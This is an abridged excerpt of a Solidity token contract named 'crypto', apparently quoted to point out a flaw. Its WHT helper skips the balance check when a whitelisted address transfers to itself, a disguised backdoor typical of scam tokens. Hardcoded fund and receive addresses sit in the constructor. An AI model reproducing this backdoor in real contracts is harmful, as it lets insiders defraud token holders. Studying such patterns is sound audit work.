...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function WHT(address send, address reciv) internal view returns (bool){
        return (send != reciv) || (_feeWhiteList[send] == false);
    }
    ...
    function _transfer(
        ...
        if (WHT(from,to)) require(balance >= amount, "balanceNotEnough");
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        address(0xB6BA90af76D139AB3170c7df0139636dB6120F7e),//RouterAddress
        address(0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd),//FISTAddress
        "crypto",//Name
        "crypto",//Symbol
        9,//Decimals
        888888,//Supply
        address(0x78cA09D299F0502a5ce58Ba4F0c9a368c8970722),//FundAddress
        address(0x3f7DDD77679606e21243bFFCAab1940d246d7840)//ReceiveAddress
    ){
    }
}